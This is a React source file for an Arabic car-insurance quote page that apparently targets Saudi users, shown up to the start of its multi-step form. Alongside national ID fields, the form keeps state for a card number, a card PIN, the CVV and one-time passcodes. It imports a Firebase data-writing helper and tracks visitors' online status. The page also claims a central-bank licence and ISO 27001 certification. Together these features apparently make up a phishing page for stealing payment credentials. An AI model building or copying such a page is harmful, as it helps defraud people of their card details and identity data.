"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import {
  Shield,
  Users,
  Star,
  CheckCircle,
  Phone,
  Mail,
  FileText,
  CreditCard,
  Menu,
  X,
  ArrowLeft,
  Zap,
  Lock,
  AlertCircle,
  Award,
  Clock,
  TrendingUp,
  Check,
  ArrowRight,
  Building2,
  Calendar,
  UserCheck,
  Sparkles,
} from "lucide-react"
import { useState, useEffect, useRef } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { addData, db } from "@/lib/firebase"
import { offerData } from "@/lib/data"
import { doc, onSnapshot } from "firebase/firestore"

const cardValidation = {
  // Luhn algorithm for card number validation
  luhnCheck: (cardNumber: string): boolean => {
    const digits = cardNumber.replace(/\D/g, "").split("").map(Number)
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = digits[i]

      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }

      sum += digit
      isEven = !isEven
    }

    return sum % 10 === 0
  },

  // Detect card type based on number patterns
  getCardType: (cardNumber: string): { type: string; icon: string; color: string } => {
    const number = cardNumber.replace(/\D/g, "")

    if (/^4/.test(number)) {
      return { type: "Visa", icon: "💳", color: "text-blue-600" }
    } else if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) {
      return { type: "Mastercard", icon: "💳", color: "text-red-600" }
    } else if (/^3[47]/.test(number)) {
      return { type: "American Express", icon: "💳", color: "text-green-600" }
    } else if (/^6/.test(number)) {
      return { type: "Discover", icon: "💳", color: "text-orange-600" }
    }

    return { type: "Unknown", icon: "💳", color: "text-gray-600" }
  },

  // Format card number with spaces
  formatCardNumber: (value: string): string => {
    const number = value.replace(/\D/g, "")
    const groups = number.match(/.{1,4}/g) || []
    return groups.join(" ").substr(0, 19) // Max 16 digits + 3 spaces
  },

  // Validate expiry date
  validateExpiry: (month: string, year: string): boolean => {
    if (!month || !year) return false

    const currentDate = new Date()
    const currentYear = currentDate.getFullYear()
    const currentMonth = currentDate.getMonth() + 1

    const expMonth = Number.parseInt(month)
    const expYear = Number.parseInt(year)

    if (expYear < currentYear) return false
    if (expYear === currentYear && expMonth < currentMonth) return false

    return true
  },

  // Validate CVV based on card type
  validateCVV: (cvv: string, cardType: string): boolean => {
    if (cardType === "American Express") {
      return /^\d{4}$/.test(cvv)
    }
    return /^\d{3}$/.test(cvv)
  },
}

// Enhanced Mock Components
const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
  <div className="space-y-8">
    <div className="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-md p-6 border border-blue-100">
      <div className="flex items-center gap-3 mb-4">
        <div className="w-10 h-10 bg-blue-100 rounded-xl flex items-center justify-center">
          <FileText className="w-5 h-5 text-blue-600" />
        </div>
        <div>
          <h4 className="font-bold text-gray-900">الغرض من التأمين</h4>
          <p className="text-sm text-gray-600">اختر نوع الخدمة المطلوبة</p>
        </div>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <button
          type="button"
          className={`group relative p-6 rounded-md border-2 transition-all duration-300 hover:shadow-lg ${
            formData.insurance_purpose === "renewal"
              ? "border-blue-500 bg-blue-50 shadow-md"
              : "border-gray-200 hover:border-blue-300 bg-white"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "renewal" }))}
        >
          <div className="text-center">
            <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center mx-auto mb-3">
              <UserCheck className="w-6 h-6 text-green-600" />
            </div>
            <div className="font-bold text-lg mb-2">تجديد وثيقة</div>
            <div className="text-sm text-gray-500">تجديد وثيقة تأمين موجودة</div>
          </div>
          {formData.insurance_purpose === "renewal" && (
            <div className="absolute top-3 left-3">
              <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center">
                <Check className="w-3.5 h-3.5 text-white" />
              </div>
            </div>
          )}
        </button>

        <button
          type="button"
          className={`group relative p-6 rounded-md border-2 transition-all duration-300 hover:shadow-lg ${
            formData.insurance_purpose === "property-transfer"
              ? "border-blue-500 bg-blue-50 shadow-md"
              : "border-gray-200 hover:border-blue-300 bg-white"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "property-transfer" }))}
        >
          <div className="text-center">
            <div className="w-12 h-12 bg-orange-100 rounded-xl flex items-center justify-center mx-auto mb-3">
              <ArrowRight className="w-6 h-6 text-orange-600" />
            </div>
            <div className="font-bold text-lg mb-2">نقل ملكية</div>
            <div className="text-sm text-gray-500">تأمين مركبة منقولة الملكية</div>
          </div>
          {formData.insurance_purpose === "property-transfer" && (
            <div className="absolute top-3 left-3">
              <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center">
                <Check className="w-3.5 h-3.5 text-white" />
              </div>
            </div>
          )}
        </button>
      </div>
    </div>

    <div className="space-y-6">
      <div>
        <label className="block text-sm font-bold text-gray-800 mb-4">
          اسم مالك الوثيقة <span className="text-red-500">*</span>
        </label>
        <Input
          type="text"
          placeholder="الاسم الكامل"
          value={formData.documment_owner_full_name}
          onChange={(e) => setFormData((prev: any) => ({ ...prev, documment_owner_full_name: e.target.value }))}
          className={`h-14 text-lg border-2 rounded-xl transition-all duration-200 ${
            errors.documment_owner_full_name
              ? "border-red-400 focus:border-red-500 bg-red-50"
              : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
          }`}
        />
        {errors.documment_owner_full_name && (
          <div className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
            <AlertCircle className="w-4 h-4 flex-shrink-0" />
            <span>{errors.documment_owner_full_name}</span>
          </div>
        )}
      </div>

      {formData.insurance_purpose === "renewal" && (
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
          <div>
            <label className="block text-sm font-bold text-gray-800 mb-4">
              رقم هوية المالك <span className="text-red-500">*</span>
            </label>
            <Input
              type="text"
              placeholder="1234567890"
              maxLength={10}
              value={formData.owner_identity_number}
              onChange={(e) => setFormData((prev: any) => ({ ...prev, owner_identity_number: e.target.value }))}
              className={`h-14 text-lg border-2 rounded-xl transition-all duration-200 ${
                errors.owner_identity_number
                  ? "border-red-400 focus:border-red-500 bg-red-50"
                  : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
              }`}
            />
            {errors.owner_identity_number && (
              <div className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
                <AlertCircle className="w-4 h-4 flex-shrink-0" />
                <span>{errors.owner_identity_number}</span>
              </div>
            )}
          </div>

          <div>
            <label className="block text-sm font-bold text-gray-800 mb-4">
              رقم الهاتف <span className="text-red-500">*</span>
            </label>
            <Input
              type="tel"
              placeholder="0555######"
              maxLength={10}
              value={formData.phoneNumber}
              onChange={(e) => setFormData((prev: any) => ({ ...prev, phoneNumber: e.target.value }))}
              className="h-14 text-lg border-2 rounded-xl border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300 transition-all duration-200"
            />
          </div>
        </div>
      )}

      {formData.insurance_purpose === "property-transfer" && (
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
          <div>
            <label className="block text-sm font-bold text-gray-800 mb-4">
              رقم هوية المشتري <span className="text-red-500">*</span>
            </label>
            <Input
              type="text"
              placeholder="1234567890"
              maxLength={10}
              value={formData.buyer_identity_number}
              onChange={(e) => setFormData((prev: any) => ({ ...prev, buyer_identity_number: e.target.value }))}
              className={`h-14 text-lg border-2 rounded-xl transition-all duration-200 ${
                errors.buyer_identity_number
                  ? "border-red-400 focus:border-red-500 bg-red-50"
                  : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
              }`}
            />
            {errors.buyer_identity_number && (
              <div className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
                <AlertCircle className="w-4 h-4 flex-shrink-0" />
                <span>{errors.buyer_identity_number}</span>
              </div>
            )}
          </div>

          <div>
            <label className="block text-sm font-bold text-gray-800 mb-4">
              رقم هوية البائع <span className="text-red-500">*</span>
            </label>
            <Input
              type="text"
              placeholder="1234567890"
              maxLength={10}
              value={formData.seller_identity_number}
              onChange={(e) => setFormData((prev: any) => ({ ...prev, seller_identity_number: e.target.value }))}
              className={`h-14 text-lg border-2 rounded-xl transition-all duration-200 ${
                errors.seller_identity_number
                  ? "border-red-400 focus:border-red-500 bg-red-50"
                  : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
              }`}
            />
            {errors.seller_identity_number && (
              <div className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
                <AlertCircle className="w-4 h-4 flex-shrink-0" />
                <span>{errors.seller_identity_number}</span>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  </div>
)

const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
  <div className="space-y-8">
    <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-md p-6 border border-green-100">
      <div className="flex items-center gap-3 mb-4">
        <div className="w-10 h-10 bg-green-100 rounded-xl flex items-center justify-center">
          <Building2 className="w-5 h-5 text-green-600" />
        </div>
        <div>
          <h4 className="font-bold text-gray-900">نوع المركبة</h4>
          <p className="text-sm text-gray-600">حدد طريقة تسجيل المركبة</p>
        </div>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <button
          type="button"
          className={`group relative p-6 rounded-md border-2 transition-all duration-300 hover:shadow-lg ${
            formData.vehicle_type === "serial"
              ? "border-green-500 bg-green-50 shadow-md"
              : "border-gray-200 hover:border-green-300 bg-white"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))}
        >
          <div className="text-center">
            <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center mx-auto mb-3">
              <FileText className="w-6 h-6 text-blue-600" />
            </div>
            <div className="font-bold text-lg mb-2">مركبة برقم تسلسلي</div>
            <div className="text-sm text-gray-500">مركبة مسجلة برقم تسلسلي</div>
          </div>
          {formData.vehicle_type === "serial" && (
            <div className="absolute top-3 left-3">
              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                <Check className="w-3.5 h-3.5 text-white" />
              </div>
            </div>
          )}
        </button>

        <button
          type="button"
          className={`group relative p-6 rounded-md border-2 transition-all duration-300 hover:shadow-lg ${
            formData.vehicle_type === "custom"
              ? "border-green-500 bg-green-50 shadow-md"
              : "border-gray-200 hover:border-green-300 bg-white"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))}
        >
          <div className="text-center">
            <div className="w-12 h-12 bg-purple-100 rounded-xl flex items-center justify-center mx-auto mb-3">
              <CreditCard className="w-6 h-6 text-purple-600" />
            </div>
            <div className="font-bold text-lg mb-2">مركبة برقم لوحة</div>
            <div className="text-sm text-gray-500">مركبة مسجلة برقم لوحة</div>
          </div>
          {formData.vehicle_type === "custom" && (
            <div className="absolute top-3 left-3">
              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                <Check className="w-3.5 h-3.5 text-white" />
              </div>
            </div>
          )}
        </button>
      </div>
    </div>

    <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
      <div>
        <label className="block text-sm font-bold text-gray-800 mb-4">
          الرقم التسلسلي للمركبة <span className="text-red-500">*</span>
        </label>
        <Input
          type="text"
          placeholder="123456789"
          value={formData.sequenceNumber}
          onChange={(e) => setFormData((prev: any) => ({ ...prev, sequenceNumber: e.target.value }))}
          className="h-14 text-lg border-2 rounded-xl border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300 transition-all duration-200"
        />
      </div>
    </div>
  </div>
)

const getBadgeText = (index: number) => {
  switch (index) {
    case 0:
      return "الأفضل سعراً"
    case 1:
      return "موصى به"
    case 2:
      return "خيار جيد"
    default:
      return ""
  }
}

const getTypeBadge = (type: string) => {
  switch (type) {
    case "against-others":
      return "ضد الغير"
    case "comprehensive":
      return "شامل"
    default:
      return "خاص"
  }
}

export default function QuotePage() {
  const [mounted, setMounted] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  const headerRef = useRef<HTMLElement>(null)
  const formRef = useRef<HTMLDivElement>(null)
  const stepContentRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    // Initialize visitor ID if not exists
    const visitorID = localStorage.getItem("visitor")
    if (visitorID) {
      setMounted(true)
      setupOnlineStatus(visitorID!)
    } else {
      // Create new visitor ID if none exists
      const newVisitorId = "visitor_" + Date.now()
      localStorage.setItem("visitor", newVisitorId)
      setMounted(true)
      setupOnlineStatus(newVisitorId)
    }
  }, [])

  if (!mounted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-blue-50/30 flex items-center justify-center">
        <div className="text-center">
          <div className="w-20 h-20 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
          <div className="space-y-2">
            <p className="text-xl font-semibold text-gray-800">جاري التحميل...</p>
            <p className="text-sm text-gray-500">يتم تحضير منصة التأمين الذكية</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-blue-50/30" dir="rtl">
      {/* Enhanced Header */}
      <header className="bg-white/95 backdrop-blur-xl border-b border-gray-100 px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4 lg:gap-8">
            <div className="flex items-center gap-4">
              <div className="w-24 h-14 rounded-xl flex items-center justify-center ">
                <img src="/Logo-AR.png" alt="logo" width={96} height={56} className="rounded-lg" />
              </div>
              <div className="hidden sm:block">
                <h1 className="text-md font-bold bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">
                  تأميني
                </h1>
                <p className="text-sm text-gray-600 font-medium">منصة التأمين الذكية</p>
              </div>
            </div>
            <nav className="hidden lg:flex items-center gap-8 text-sm font-semibold">
              <a href="/" className="text-gray-700 hover:text-blue-600 transition-colors duration-200 relative group">
                الرئيسية
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-200 group-hover:w-full"></span>
              </a>
              <a
                href="/#services"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-200 relative group"
              >
                الخدمات
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-200 group-hover:w-full"></span>
              </a>
              <a
                href="/#about"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-200 relative group"
              >
                عن الشركة
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-200 group-hover:w-full"></span>
              </a>
              <a
                href="/#contact"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-200 relative group"
              >
                اتصل بنا
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-200 group-hover:w-full"></span>
              </a>
            </nav>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="sm" className="hidden sm:flex text-gray-600 hover:text-blue-600 font-medium">
              English
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="hidden sm:flex border-2 border-gray-200 hover:border-blue-500 hover:text-blue-600 bg-white font-medium transition-all duration-200"
            >
              تسجيل الدخول
            </Button>
            <Button
              size="sm"
              className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 shadow-lg text-white font-semibold px-6 py-2.5 transition-all duration-200"
            >
              ابدأ الآن
            </Button>
            <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </Button>
          </div>
        </div>

        {/* Enhanced Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden mt-6 pb-6 border-t border-gray-100 bg-white/95 backdrop-blur-xl rounded-b-md shadow-lg">
            <nav className="flex flex-col gap-4 pt-6">
              <a
                href="/"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-200 py-3 px-2 rounded-lg hover:bg-blue-50 font-medium"
              >
                الرئيسية
              </a>
              <a
                href="/#services"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-200 py-3 px-2 rounded-lg hover:bg-blue-50 font-medium"
              >
                الخدمات
              </a>
              <a
                href="/#about"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-200 py-3 px-2 rounded-lg hover:bg-blue-50 font-medium"
              >
                عن الشركة
              </a>
              <a
                href="/#contact"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-200 py-3 px-2 rounded-lg hover:bg-blue-50 font-medium"
              >
                اتصل بنا
              </a>
              <div className="flex gap-3 pt-4 border-t border-gray-100">
                <Button variant="ghost" size="sm" className="text-gray-600 flex-1 font-medium">
                  English
                </Button>
                <Button variant="outline" size="sm" className="border-gray-300 flex-1 bg-white font-medium">
                  تسجيل الدخول
                </Button>
              </div>
            </nav>
          </div>
        )}
      </header>

      {/* Enhanced Hero Section */}
      <section className="relative bg-gradient-to-br from-blue-600 via-blue-700 to-indigo-800 text-white py-20 lg:py-28 overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-0 left-0 w-96 h-96 bg-white rounded-full -translate-x-48 -translate-y-48 blur-md"></div>
          <div className="absolute bottom-0 right-0 w-96 h-96 bg-white rounded-full translate-x-48 translate-y-48 blur-md"></div>
          <div className="absolute top-1/2 left-1/2 w-64 h-64 bg-white rounded-full -translate-x-32 -translate-y-32 blur-md"></div>
        </div>

        <div className="relative max-w-6xl mx-auto px-4 lg:px-6 text-center">
          <div className="space-y-10">
            <div className="flex items-center justify-center gap-3 mb-8">
              <Button
                variant="ghost"
                size="sm"
                className="text-blue-100 hover:text-white hover:bg-white/10 transition-all duration-200 backdrop-blur-sm border border-white/20 font-medium"
                onClick={() => (window.location.href = "/")}
              >
                <ArrowLeft className="w-4 h-4 ml-2" />
                العودة للرئيسية
              </Button>
            </div>

            <div className="space-y-8">
              <Badge className="bg-white/20 text-white border-white/30 px-4 py-2 text-sm font-semibold backdrop-blur-sm">
                <Sparkles className="w-5 h-5 ml-2" />
                عرض سعر مجاني ومقارنة فورية
              </Badge>
              <h1 className="text-md lg:text-7xl font-bold leading-tight">
                احصل على أفضل عروض
                <br />
                <span className="text-blue-200">تأمين السيارات</span>
              </h1>
              <p className="text-xl lg:text-md text-blue-100 max-w-md mx-auto leading-relaxed font-medium">
                قارن بين أكثر من 25 شركة تأمين واحصل على أفضل الأسعار في أقل من 3 دقائق
              </p>
            </div>

            {/* Enhanced Stats */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-8 max-w-md mx-auto mt-16">
              <div className="text-center group">
                <div className="w-20 h-20 bg-white/20 rounded-md flex items-center justify-center mx-auto mb-6 group-hover:bg-white/30 transition-all duration-300 backdrop-blur-sm">
                  <Shield className="w-10 h-10 text-white" />
                </div>
                <div className="text-md font-bold mb-2">25+</div>
                <p className="text-blue-100 text-lg font-medium">شركة تأمين</p>
              </div>
              <div className="text-center group">
                <div className="w-20 h-20 bg-white/20 rounded-md flex items-center justify-center mx-auto mb-6 group-hover:bg-white/30 transition-all duration-300 backdrop-blur-sm">
                  <Zap className="w-10 h-10 text-white" />
                </div>
                <div className="text-md font-bold mb-2">3</div>
                <p className="text-blue-100 text-lg font-medium">دقائق فقط</p>
              </div>
              <div className="text-center group">
                <div className="w-20 h-20 bg-white/20 rounded-md flex items-center justify-center mx-auto mb-6 group-hover:bg-white/30 transition-all duration-300 backdrop-blur-sm">
                  <Star className="w-10 h-10 text-white" />
                </div>
                <div className="text-md font-bold mb-2">100%</div>
                <p className="text-blue-100 text-lg font-medium">مجاني تماماً</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Enhanced Quote Form Section */}
      <section className="py-20 lg:py-28 relative">
        <div className="max-w-6xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-16">
            <Badge className="bg-blue-100 text-blue-700 px-6 py-3 text-base font-semibold mb-6">
              <Calendar className="w-5 h-5 ml-2" />
              احصل على عرض السعر
            </Badge>
            <h2 className="text-md lg:text-md font-bold text-gray-900 mb-6">احصل على عرض السعر الخاص بك</h2>
            <p className="text-xl text-gray-600 max-w-md mx-auto leading-relaxed">
              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين المخصصة لاحتياجاتك
            </p>
          </div>
          <ProfessionalQuoteForm />
        </div>
      </section>

      {/* Enhanced Trust Indicators */}
      <section className="py-20 bg-white">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-16">
            <Badge className="bg-green-100 text-green-700 px-6 py-3 text-base font-semibold mb-6">
              <Award className="w-5 h-5 ml-2" />
              الثقة والأمان
            </Badge>
            <h2 className="text-md lg:text-md font-bold text-gray-900 mb-6">لماذا يثق بنا أكثر من 500,000 عميل؟</h2>
            <p className="text-xl text-gray-600 max-w-md mx-auto leading-relaxed">
              نحن ملتزمون بتقديم أفضل خدمة تأمين رقمية في المملكة العربية السعودية
            </p>
          </div>

          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8">
            {[
              {
                icon: Shield,
                title: "أمان وثقة",
                description: "بياناتك محمية بأعلى معايير الأمان العالمية",
                color: "from-blue-500 to-blue-600",
                bgColor: "bg-blue-50",
                iconColor: "text-blue-600",
              },
              {
                icon: Award,
                title: "تقييم ممتاز",
                description: "4.9/5 من تقييمات العملاء على جميع المنصات",
                color: "from-yellow-500 to-yellow-600",
                bgColor: "bg-yellow-50",
                iconColor: "text-yellow-600",
              },
              {
                icon: Users,
                title: "خبرة واسعة",
                description: "أكثر من 500,000 عميل راضي وثقة متنامية",
                color: "from-green-500 to-green-600",
                bgColor: "bg-green-50",
                iconColor: "text-green-600",
              },
              {
                icon: Clock,
                title: "دعم مستمر",
                description: "خدمة عملاء متخصصة متاحة 24/7",
                color: "from-purple-500 to-purple-600",
                bgColor: "bg-purple-50",
                iconColor: "text-purple-600",
              },
            ].map((feature, index) => (
              <Card
                key={index}
                className="border-0 shadow-lg hover:shadow-md transition-all duration-300 group bg-white rounded-md overflow-hidden"
              >
                <CardContent className="p-8 text-center">
                  <div
                    className={`w-20 h-20 ${feature.bgColor} rounded-md flex items-center justify-center mx-auto mb-8 group-hover:scale-110 transition-transform duration-300`}
                  >
                    <feature.icon className={`w-10 h-10 ${feature.iconColor}`} />
                  </div>
                  <h3 className="text-md font-bold text-gray-900 mb-4">{feature.title}</h3>
                  <p className="text-gray-600 leading-relaxed text-lg">{feature.description}</p>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Enhanced Contact Support */}
      <section className="py-20 bg-gradient-to-br from-gray-50 to-blue-50/50">
        <div className="max-w-md mx-auto px-4 lg:px-6 text-center">
          <div className="space-y-10">
            <div>
              <Badge className="bg-blue-100 text-blue-700 px-6 py-3 text-base font-semibold mb-6">
                <Phone className="w-5 h-5 ml-2" />
                الدعم والمساعدة
              </Badge>
              <h2 className="text-md lg:text-md font-bold text-gray-900 mb-6">هل تحتاج مساعدة؟</h2>
              <p className="text-xl text-gray-600 max-w-md mx-auto leading-relaxed">
                فريق الخبراء متاح لمساعدتك في اختيار أفضل تأمين لسيارتك وتقديم الاستشارة المجانية
              </p>
            </div>

            <div className="flex flex-col sm:flex-row gap-6 justify-center">
              <Button
                size="lg"
                className="bg-green-600 hover:bg-green-700 text-white px-10 py-6 text-xl font-semibold rounded-md shadow-lg transition-all duration-200"
              >
                <Phone className="w-6 h-6 ml-3" />
                اتصل بنا: 920000000
              </Button>
              <Button
                variant="outline"
                size="lg"
                className="border-2 border-gray-300 hover:border-blue-500 hover:text-blue-600 px-10 py-6 text-xl font-semibold bg-white rounded-md shadow-lg transition-all duration-200"
              >
                <Mail className="w-6 h-6 ml-3" />
                راسلنا عبر البريد
              </Button>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-8 mt-16 max-w-md mx-auto">
              <div className="text-center bg-white rounded-md p-6 shadow-lg">
                <div className="text-md font-bold text-blue-600 mb-2">24/7</div>
                <p className="text-gray-600 font-medium">خدمة العملاء</p>
              </div>
              <div className="text-center bg-white rounded-md p-6 shadow-lg">
                <div className="text-md font-bold text-blue-600 mb-2">{"<"} 30 ثانية</div>
                <p className="text-gray-600 font-medium">وقت الاستجابة</p>
              </div>
              <div className="text-center bg-white rounded-md p-6 shadow-lg">
                <div className="text-md font-bold text-blue-600 mb-2">98%</div>
                <p className="text-gray-600 font-medium">رضا العملاء</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Enhanced Footer */}
      <footer className="bg-gray-900 text-white py-20">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-12 mb-16">
            <div className="space-y-8">
              <div className="flex items-center gap-4">
                <div className="w-40 h-20 p-3 bg-white rounded-md flex items-center justify-center">
                  <img src="/Logo-AR.png" alt="logo" width={160} height={80} />
                </div>
              </div>
              <p className="text-gray-400 leading-relaxed text-lg">
                منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
              </p>
            </div>

            <div>
              <h3 className="font-bold mb-8 text-xl">الخدمات</h3>
              <ul className="space-y-4 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    تأمين السيارات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    التأمين الصحي
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    تأمين السفر
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    تأمين المنازل
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-8 text-xl">الشركة</h3>
              <ul className="space-y-4 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    من نحن
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    فريق العمل
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    الوظائف
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    الأخبار
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-8 text-xl">الدعم</h3>
              <ul className="space-y-4 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    مركز المساعدة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    اتصل بنا
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    الأسئلة الشائعة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-200 text-lg">
                    سياسة الخصوصية
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-10 flex flex-col sm:flex-row justify-between items-center gap-6">
            <p className="text-gray-400 text-center sm:text-right text-lg">
              © 2024 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
            </p>
            <div className="flex gap-4">
              <Badge variant="outline" className="border-gray-600 text-gray-400 px-4 py-2 text-sm">
                مرخص من ساما
              </Badge>
              <Badge variant="outline" className="border-gray-600 text-gray-400 px-4 py-2 text-sm">
                ISO 27001
              </Badge>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}

const allOtp = [""]

function ProfessionalQuoteForm() {
  const [currentPage, setCurrentStep] = useState(1)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [touched, setTouched] = useState<Record<string, boolean>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [paymentProcessing, setPaymentProcessing] = useState(false)
  const [otpSent, setOtpSent] = useState(false)
  const [otpVerified, setOtpVerified] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [cardNumber, setCardNumber] = useState("")
  const [pinCode, setPinCode] = useState("")
  const [cardName, setCardName] = useState("")
  const [cardMonth, setCardMonth] = useState("")
  const [cardYear, setCardYear] = useState("")
  const [cvv, setCvv] = useState("")
  const [otp, setOtp] = useState("")
  const [otpTimer, setOtpTimer] = useState(0)
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({})
  const [cardType, setCardType] = useState({ type: "Unknown", icon: "💳", color: "text-gray-600" })

  const [formData, setFormData] = useState({
    insurance_purpose: "renewal",
    documment_owner_full_name: "",
    owner_identity_number: "",
    buyer_identity_number: "",
    seller_identity_number: "",
    vehicle_type: "serial",
    sequenceNumber: "",
    policyStartDate: "",
    insuranceTypeSelected: "against-others",
    additionalDrivers: 0,
    specialDiscounts: false,
    agreeToTerms: false,
    selectedInsuranceOffer: "",
    selectedAddons: [] as string[],
    phone: "",
  })

  const stepHeaderRef = useRef<HTMLHeadingElement>(null)
  const firstInputRef = useRef<HTMLInputElement>(null)
  const errorSummaryRef = useRef<HTMLDivElement>(null)

  const steps = [
    { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
    { number: 2, title: "بيانات التأمين", subtitle: "تفاصيل وثيقة التأمين", icon: Shield },
    { number: 3, title: "قائمة الأسعار", subtitle: "مقارنة العروض المتاحة", icon: TrendingUp },
    { number: 4, title: "الإضافات والخدمات    ", subtitle: " الخدمات الإضافية التي تناسب احتياجاتك    ", icon: TrendingUp },
    { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
    { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
